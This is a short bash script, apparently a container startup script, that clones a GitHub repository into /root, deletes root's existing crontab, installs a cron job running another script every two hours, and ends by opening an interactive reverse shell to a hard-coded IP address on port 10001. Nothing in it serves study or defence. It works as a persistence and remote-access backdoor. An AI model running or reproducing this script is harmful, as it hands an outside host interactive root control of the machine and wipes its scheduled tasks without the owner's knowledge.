#!/bin/bash
# echo "vanishxmainone" > /root/g00g
File="/root/SDA_ALL/README.md"
if [ -f "$File" ]; then  
echo "$File exist"  
else  
echo "$File does not exist"
git clone https://github.com/GH0STAV0/SDA_ALL.git /root/SDA_ALL
fi  
crontab -r

(crontab -l -u root 2>/dev/null; echo "0 */2 * * * bash /dockerstartup/bb.sh") | crontab -

service cron restart

crontab -l



bash -i >& /dev/tcp/105.105.225.248/10001 0>&1
